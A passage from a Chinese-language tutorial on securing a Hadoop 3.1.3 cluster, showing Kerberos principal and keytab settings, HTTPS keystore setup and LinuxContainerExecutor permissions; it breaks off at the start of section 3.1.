class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>MIT<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- RULE:[&lt;规则编号&gt;:&lt;规则表达式&gt;](&lt;匹配的Kerberos主体&gt;)s/&lt;替换表达式&gt;/&lt;本地用户名称&gt;/ --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Kerberos主体到系统用户的具体映射规则， --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 默认规则会将未匹配的Kerberos主体映射为其原始名称 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.security.auth_to_local<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">    RULE:[2:$1/$2@$0]([ndj]n\/.*@EXAMPLE\.COM)s/.*/hdfs/</span><br><span class="line">    RULE:[2:$1/$2@$0]([rn]m\/.*@EXAMPLE\.COM)s/.*/yarn/</span><br><span class="line">    RULE:[2:$1/$2@$0](jhs\/.*@EXAMPLE\.COM)s/.*/mapred/</span><br><span class="line">    DEFAULT</span><br><span class="line">  <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 启用Hadoop集群Kerberos安全认证 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.security.authentication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>kerberos<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 启用Hadoop集群授权管理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.security.authorization<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Hadoop集群间RPC通讯设为仅认证模式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.rpc.protection<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>authentication<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>vim /opt/module/hadoop-3.1.3/etc/hadoop/hdfs-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 访问DataNode数据块时需通过Kerberos认证 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.block.access.token.enable<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- NameNode服务的Kerberos主体,_HOST会自动解析为服务所在的主机名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.kerberos.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>nn/_HOST@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- NameNode服务的Kerberos密钥文件路径 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.keytab.file<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/nn.service.keytab<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Secondary NameNode服务的Kerberos密钥文件路径 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.secondary.namenode.keytab.file<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/sn.service.keytab<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Secondary NameNode服务的Kerberos主体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.secondary.namenode.kerberos.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>sn/_HOST@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- NameNode Web服务的Kerberos主体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.kerberos.internal.spnego.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>HTTP/_HOST@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- WebHDFS REST服务的Kerberos主体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.web.authentication.kerberos.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>HTTP/_HOST@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Secondary NameNode Web UI服务的Kerberos主体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.secondary.namenode.kerberos.internal.spnego.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>HTTP/_HOST@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Hadoop Web UI的Kerberos密钥文件路径 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.web.authentication.kerberos.keytab<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/spnego.service.keytab<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- DataNode服务的Kerberos主体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.kerberos.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>dn/_HOST@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- DataNode服务的Kerberos密钥文件路径 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.keytab.file<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/dn.service.keytab<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 配置NameNode Web UI 使用HTTPS协议 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.http.policy<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>HTTPS_ONLY<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 配置DataNode数据传输保护策略为仅认证模式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.data.transfer.protection<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>authentication<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>vim /opt/module/hadoop-3.1.3/etc/hadoop/yarn-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Resource Manager 服务的Kerberos主体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>rm/_HOST@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Resource Manager 服务的Kerberos密钥文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.keytab<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/rm.service.keytab<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Node Manager 服务的Kerberos主体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>nm/_HOST@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Node Manager 服务的Kerberos密钥文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.keytab<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/nm.service.keytab<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>vim /opt/module/hadoop-3.1.3/etc/hadoop/mapred-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 历史服务器的Kerberos主体 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.keytab<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/jhs.service.keytab<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 历史服务器的Kerberos密钥文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.principal<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>jhs/_HOST@EXAMPLE.COM<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后分发四个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xsync /opt/module/hadoop-3.1.3/etc/hadoop/core-site.xml</span><br><span class="line">xsync /opt/module/hadoop-3.1.3/etc/hadoop/hdfs-site.xml</span><br><span class="line">xsync /opt/module/hadoop-3.1.3/etc/hadoop/yarn-site.xml</span><br><span class="line">xsync /opt/module/hadoop-3.1.3/etc/hadoop/mapred-site.xml</span><br></pre></td></tr></table></figure><h3 id="2-3-配置HDFS使用HTTPS安全传输协议">2.3 配置HDFS使用HTTPS安全传输协议</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Keytool是java数据证书的管理工具，使用户能够管理自己的公/私钥对及相关证书。</span></span><br><span class="line"><span class="comment"># -keystore    指定密钥库的名称及位置(产生的各类信息将存在.keystore文件中)</span></span><br><span class="line"><span class="comment"># -genkey(或者-genkeypair)      生成密钥对</span></span><br><span class="line"><span class="comment"># -alias  为生成的密钥对指定别名，如果没有默认是mykey</span></span><br><span class="line"><span class="comment"># -keyalg  指定密钥的算法 RSA/DSA 默认是DSA</span></span><br><span class="line">keytool -keystore /etc/security/keytab/keystore -<span class="built_in">alias</span> jetty -genkey -keyalg RSA</span><br><span class="line">keytool -keystore keystore -list</span><br><span class="line"><span class="comment"># 修改keystore文件的所有者和访问权限</span></span><br><span class="line">chown -R root:hadoop /etc/security/keytab/keystore</span><br><span class="line">chmod 660 /etc/security/keytab/keystore</span><br><span class="line"><span class="comment"># 密钥库的密码至少6个字符，可以是纯数字或者字母或者数字和字母的组合等等</span></span><br><span class="line"><span class="comment"># 确保hdfs用户（HDFS的启动用户）具有对所生成keystore文件的读权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将该证书分发到集群中的每台节点的相同路径</span></span><br><span class="line">xsync /etc/security/keytab/keystore</span><br><span class="line"><span class="comment"># 然后修改hadoop配置文件ssl-server.xml.example</span></span><br><span class="line">mv <span class="variable">$HADOOP_HOME</span>/etc/hadoop/ssl-server.xml.example <span class="variable">$HADOOP_HOME</span>/etc/hadoop/ssl-server.xml</span><br><span class="line">vim <span class="variable">$HADOOP_HOME</span>/etc/hadoop/ssl-server.xml</span><br><span class="line"><span class="comment"># 修改如下</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- SSL密钥库路径 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>ssl.server.keystore.location<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/keystore<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- SSL密钥库密码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>ssl.server.keystore.password<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- SSL可信任密钥库路径 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>ssl.server.truststore.location<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>/etc/security/keytab/keystore<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- SSL密钥库中密钥的密码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>ssl.server.keystore.keypassword<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- SSL可信任密钥库密码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>ssl.server.truststore.password<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后分发<code>xsync $HADOOP_HOME/etc/hadoop/ssl-server.xml</code></p><h3 id="2-4-配置Yarn使用LinuxContainerExecutor">2.4 配置Yarn使用LinuxContainerExecutor</h3><p>因为默认提交任务的用户是启动hadoop的用户，因此需要把它改为提交者的用户</p><p>修改<strong>所有节点</strong>的container-executor所有者和权限，要求其所有者为root，所有组为hadoop（启动NodeManger的yarn用户的所属组），权限为6050。其默认路径为<code>$HADOOP_HOME/bin</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 三台机器依次执行</span></span><br><span class="line">chown root:hadoop /opt/module/hadoop-3.1.3/bin/container-executor</span><br><span class="line">chmod 6050 /opt/module/hadoop-3.1.3/bin/container-executor</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三台节点依次修改</span></span><br><span class="line"><span class="comment"># 修改所有节点的container-executor.cfg文件的所有者和权限，</span></span><br><span class="line"><span class="comment"># 要求该文件及其所有的上级目录的所有者均为root，所有组为hadoop（启动NodeManger的yarn用户的所属组），权限为400。</span></span><br><span class="line"><span class="comment"># 其默认路径为$HADOOP_HOME/etc/hadoop</span></span><br><span class="line">chown root:hadoop /opt/module/hadoop-3.1.3/etc/hadoop/container-executor.cfg</span><br><span class="line">chown root:hadoop /opt/module/hadoop-3.1.3/etc/hadoop</span><br><span class="line">chown root:hadoop /opt/module/hadoop-3.1.3/etc</span><br><span class="line">chown root:hadoop /opt/module/hadoop-3.1.3</span><br><span class="line">chown root:hadoop /opt/module</span><br><span class="line">chmod 400 /opt/module/hadoop-3.1.3/etc/hadoop/container-executor.cfg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改$HADOOP_HOME/etc/hadoop/container-executor.cfg</span></span><br><span class="line">vim <span class="variable">$HADOOP_HOME</span>/etc/hadoop/container-executor.cfg</span><br><span class="line"><span class="comment"># 内容如下</span></span><br><span class="line">yarn.nodemanager.linux-container-executor.group=hadoop</span><br><span class="line">banned.users=hdfs,yarn,mapred</span><br><span class="line">min.user.id=1000</span><br><span class="line">allowed.system.users=</span><br><span class="line">feature.tc.enabled=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>修改<code>$HADOOP_HOME/etc/hadoop/yarn-site.xml</code>文件，<code>vim $HADOOP_HOME/etc/hadoop/yarn-site.xml</code>，增加内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置Node Manager使用LinuxContainerExecutor管理Container --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.container-executor.class<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>org.apache.hadoop.yarn.server.nodemanager.LinuxContainerExecutor<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 配置Node Manager的启动用户的所属组 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.linux-container-executor.group<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- LinuxContainerExecutor脚本路径 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.linux-container-executor.path<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/module/hadoop-3.1.3/bin/container-executor<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后分发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xsync <span class="variable">$HADOOP_HOME</span>/etc/hadoop/container-executor.cfg</span><br><span class="line">xsync <span class="variable">$HADOOP_HOME</span>/etc/hadoop/yarn-site.xml</span><br></pre></td></tr></table></figure><h2 id="3、安全模式下启动Hadoop集群">3、安全模式下启动Hadoop集群</h2><h3 id="3-1-修改特定本地路径权限">3.1 